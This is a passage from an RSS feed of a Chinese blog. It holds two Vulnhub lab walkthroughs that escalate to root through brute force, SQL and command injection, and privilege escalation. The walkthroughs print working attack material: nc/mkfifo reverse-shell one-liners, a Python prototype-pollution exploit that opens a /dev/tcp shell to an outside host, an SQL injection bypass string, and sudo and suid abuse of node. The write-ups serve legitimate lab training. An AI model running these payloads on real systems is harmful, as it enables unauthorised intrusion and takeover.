对发现目标进行全端口扫描</span><br><span class="line">nmap -p22,80,8000 -sV 192.168.56.109  对目标开放端口进行服务识别</span><br><span class="line"></span><br><span class="line">通过扫描发现目标开启22,80,8000端口，一个ssh,两个web服务，</span><br><span class="line">80使用apache实现，8000使用nodejs,并且获得了对应版本信息，操作系统版本信息为ubuntu</span><br></pre></td></tr></table></figure><h2 id="服务进攻"><a href="#服务进攻" class="headerlink" title="服务进攻"></a>服务进攻</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -P rockyou.txt -t 32 -vV 192.168.56.109  ssh -f   首先对发现的第一个点进行攻击,使用hydra 进行ssh暴力破解</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>随后对下一个发现点进行测试，浏览器访问80,8000端口发现源代码里面存在一段相同jscript代码</p><p>通过cyberchef进行js代码美化，使代码便于分析，发现里面存在一个域名，但是并没有解析</p><p>通过本地hosts文件进行解析，使这段js代码能够正常访问这个域名</p><p>随后重新访问80,或者8000网站，js脚本正常加载，域名能够正常访问，发现多出了一个时间显示</p><p>随后使用burpsuite查看请求，发现一个get “&#x2F;date?format&#x3D;”请求,随后页面返回一个当前时间信息</p><p>随后将提交的数据放入cyberchef进行分析，发现编码为base58编码，解密后的信息为linux命令date的参数，猜测为直接调用date 命令返回信息，猜测存在命令注入漏洞</p><p>随后进行测试，将 ;ls 通过base58进行加密后提交，页面显示出目录信息，确定存在命令注入漏洞</p><p>进行命令测试，查找反弹shell的方式,将;ls &#x2F;bin 编码后提交,获得可执行的命令列表，发现存在nc</p><p>尝试利用nc反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -vnlp 1111   本地监听1111端口，等待目标连接</span><br><span class="line"><span class="built_in">rm</span> /tmp/f;<span class="built_in">mkfifo</span> /tmp/f;<span class="built_in">cat</span> /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.1 1111 &gt;/tmp/f  通过此命令进行shell 反弹连接</span><br></pre></td></tr></table></figure><p>数据提交后页面显示错误信息，但是并没有影响shell的连接</p><p>账号为www-data，目录下发现web程序的源代码程序，进行代码分析<br>代码中对提交数据进行了判断，如果提交了whoami,id,nc等数据会反馈错误信息，但是并没有进行拦截，所以并不影响nc执行</p><p>随后在上一级目录中发现了另外一个目录<br>在其中一个文件中发现了使用的框架：express，express-fileupload<br>并且本地开启了8080,监听在127.0.0.1 只能当前主机本地访问，所以扫描无法发现</p><p>通过搜索引擎进行查找发现存在漏洞，随后在：<a href="https://blog.p6.is/Real-World-JS-1/">https://blog.p6.is/Real-World-JS-1/</a>  找到漏洞利用代码,修改目标端口，ip信息后执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">cmd = <span class="string">&#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/p6.is/8888 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"><span class="comment"># pollute</span></span><br><span class="line">requests.post(<span class="string">&#x27;http://p6.is:7777&#x27;</span>, files = &#123;<span class="string">&#x27;__proto__.outputFunctionName&#x27;</span>: (</span><br><span class="line">    None, f<span class="string">&quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;&#123;cmd&#125;&#x27;);x&quot;</span>)&#125;)</span><br><span class="line"><span class="comment"># execute command</span></span><br><span class="line">requests.get(<span class="string">&#x27;http://p6.is:7777&#x27;</span>)</span><br></pre></td></tr></table></figure><p>随后获得另外一个用户的shell,用户目录下存在一个flag文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -l  查看当前用户的sudo权限</span><br><span class="line"></span><br><span class="line">执行后发现当前用户可以无密码sudo执行npm,node</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo node -e <span class="string">&quot;require(&#x27;child_process&#x27;).exec(&#x27;rm /tmp/m;mkfifo /tmp/m;cat /tmp/m|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.1 9999 &gt;/tmp/m&#x27;)&quot;</span> </span><br><span class="line"></span><br><span class="line">使用sudo权限执行node,通过node调用nc反弹shell,获得root权限</span><br><span class="line">root目录下存在第二个flag</span><br></pre></td></tr></table></figure><h1 id="完结撒花"><a href="#完结撒花" class="headerlink" title="完结撒花"></a>完结撒花</h1><h2 id="积极向上"><a href="#积极向上" class="headerlink" title="积极向上"></a>积极向上</h2><h2 id="热爱生活"><a href="#热爱生活" class="headerlink" title="热爱生活"></a>热爱生活</h2><div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>啊，再见了，再见了，哈 </p></div><div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>我们会再见的对么</p></div><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>再见你要幸福</p></div><div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>燕子，燕子</p></div>]]></content:encoded>
      
      
      <category domain="https://0a00.github.io/categories/%E9%9D%B6%E5%9C%BA/">靶场</category>
      
      <category domain="https://0a00.github.io/categories/%E9%9D%B6%E5%9C%BA/vulnhub/">vulnhub</category>
      
      
      <category domain="https://0a00.github.io/tags/vulnhub/">vulnhub</category>
      
      <category domain="https://0a00.github.io/tags/web/">web</category>
      
      <category domain="https://0a00.github.io/tags/all/">all</category>
      
      <category domain="https://0a00.github.io/tags/%E9%9D%B6%E5%9C%BA/">靶场</category>
      
      
      <comments>https://0a00.github.io/2022/11/17/bc6/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Vulnhub靶场BoredHackerBlog</title>
      <link>https://0a00.github.io/2022/11/12/bac5/</link>
      <guid>https://0a00.github.io/2022/11/12/bac5/</guid>
      <pubDate>Sat, 12 Nov 2022 08:08:45 GMT</pubDate>
      
      <description>Vulnhub靶场BoredHackerBlog</description>
      
      
      
      <content:encoded><![CDATA[<div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>你好啊 </p></div><div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>吃了么,睡了么</p></div><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>有拥抱么，有晚安么</p></div><div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布,哈，我又赢了 </p></div><h1 id="靶场简介"><a href="#靶场简介" class="headerlink" title="靶场简介"></a>靶场简介</h1><div class="timeline blue"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2022</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>11-12</p></div></div><div class='timeline-item-content'><h6 id="Vulnhub"><a href="#Vulnhub" class="headerlink" title="Vulnhub"></a>Vulnhub</h6><p>地址：<a href="https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/">https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/</a></p><p>描述:<br>这是一个云端反病毒扫描程序！是一种基于云的防病毒扫描服务。<br>目前，它处于测试模式。系统要求您测试设置并查找漏洞并升级隐私。</p><p>难度：简单<br>目标：获得root权限</p><p>涉及的任务：<br>端口扫描<br>网页应用攻击<br>SQL注入<br>命令注入<br>暴力破解<br>代码分析</p></div></div></div><h1 id="系统环境"><a href="#系统环境" class="headerlink" title="系统环境"></a>系统环境</h1><div class="timeline green"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2022</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>11-12</p></div></div><div class='timeline-item-content'><h6 id="操作系统："><a href="#操作系统：" class="headerlink" title="操作系统："></a>操作系统：</h6><p>物理机：Arch linux<br>虚拟机：kali linux<br>虚拟机程序：Virtualbox</p><h6 id="使用程序："><a href="#使用程序：" class="headerlink" title="使用程序："></a>使用程序：</h6><p>arp-scan  用于目标发现<br>ping      用于目标发现<br>arping    用于目标发现<br>nmap      用于服务识别<br>nc        用于shell反弹<br>hydra     用于密码破解<br>burpsuite 用于web测试</p></div></div></div><h1 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -I eth0 -l                                                               <span class="comment">#arp发现，确定目标ip地址</span></span><br><span class="line">nmap -sn 192.168.56.1/24                                                          <span class="comment">#ping扫描，禁用端口扫描</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">seq</span> 0 10); <span class="keyword">do</span> ping -c 1 192.168.56.<span class="variable">$i</span>; <span class="keyword">done</span>                 <span class="comment">#shell 批量ping扫描 </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">seq</span> 0 10); <span class="keyword">do</span> sudo arping -c 1 192.168.56.<span class="variable">$i</span>; <span class="keyword">done</span>     <span class="comment">#shell 批量arping扫描</span></span><br><span class="line"></span><br><span class="line">部分列举，方式很多，根据实际场景进行选择测试</span><br></pre></td></tr></table></figure><h2 id="服务识别"><a href="#服务识别" class="headerlink" title="服务识别"></a>服务识别</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 192.168.56.108    <span class="comment">#进行全端口扫描</span></span><br><span class="line">nmap -p22,8080 192.168.56.108    <span class="comment">#进行端口服务识别</span></span><br><span class="line"></span><br><span class="line">根据发现的主机目标进行全端口扫描，随后进行端口服务发现</span><br></pre></td></tr></table></figure><h2 id="服务入侵"><a href="#服务入侵" class="headerlink" title="服务入侵"></a>服务入侵</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -P rockyou.txt -t 32 -vV  192.168.56.108 ssh -f     <span class="comment">#指定账户，密码字典，对目标进行ssh暴力破解 </span></span><br><span class="line"></span><br><span class="line">对发现的服务进行入侵，ssh尝试未果</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh暴力破解长时间未成功，随后web访问8080端口，出现输入框，需要密码，简单测试后发现sql注入漏洞</span><br><span class="line">注入代码：<span class="string">&quot; or 1=1 --  后面有一个空格</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">随后进入一个新的页面，简单测试后发现存在命令行注入漏洞</span><br><span class="line">命令行注入代码： | <span class="built_in">command</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通过命令行注入，执行nc,反弹shell</span><br><span class="line"><span class="built_in">rm</span> /tmp/m;<span class="built_in">mkfifo</span> /tmp/m;<span class="built_in">cat</span> /tmp/m|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.107 4444 &gt;/tmp/m</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">随后在用户主目录发现拥有suid,root权限的可执行程序，通过此程序调用nc反弹shell,获得root权限</span><br><span class="line">./upload_cloudav <span class="string">&quot;rm /tmp/m;mkfifo /tmp/m;cat /tmp/m|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.107 5555 &gt;/tmp/m&quot;</span></span><br></pre></td></tr></table></figure><h1 id="完结撒花"><a href="#完结撒花" class="headerlink" title="完结撒花"></a>完结撒花</h1><h2 id="积极向上"><a href="#积极向上" class="headerlink" title="积极向上"></a>积极向上</h2><h2 id="热爱生活"><a href="#热爱生活" class="headerlink" title="热爱生活"></a>热爱生活</h2><div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>啊，再见了，再见了，哈 </p></div><div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>我们会再见的对么</p></div><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>再见你要幸福</p></div><div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>燕子，燕子</p></div>]]></content:encoded>
      
      
      <category domain="https://0a00.github.io/categories/%E9%9D%B6%E5%9C%BA/">靶场</category>
      
      <category domain="https://0a00.github.io/categories/%E9%9D%B6%E5%9C%BA/vulnhub/">vulnhub</category>
      
      
      <category domain="https://0a00.github.io/tags/vulnhub/">vulnhub</category>
      
      <category domain="https://0a00.github.io/tags/web/">web</category>
      
      <category domain="https://0a00.github.io/tags/all/">all</category>
      
      <category domain="https://0a00.github.io/tags/%E9%9D%B6%E5%9C%BA/">靶场</category>
      
      
      <comments>https://0a00.github.io/2022/11/12/bac5/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
